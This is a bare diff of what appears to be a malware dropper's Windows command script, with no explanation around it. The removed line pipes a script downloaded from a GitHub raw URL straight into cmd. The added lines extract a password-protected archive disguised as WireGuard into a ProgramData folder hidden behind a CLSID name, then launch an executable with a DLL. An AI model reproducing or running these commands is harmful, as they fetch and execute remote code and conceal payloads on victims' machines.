@@ -1,1 +1,2 @@
-curl.exe -s https://raw.githubusercontent.com/nugp/1/1/1/tog | cmd /V:ON
+$env:ProgramData\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe x -y -o+ -p741258963 $env:ProgramData\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar $env:ProgramData\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\
+$env:ProgramData\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Wire.exe $env:ProgramData\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\winfw.dll
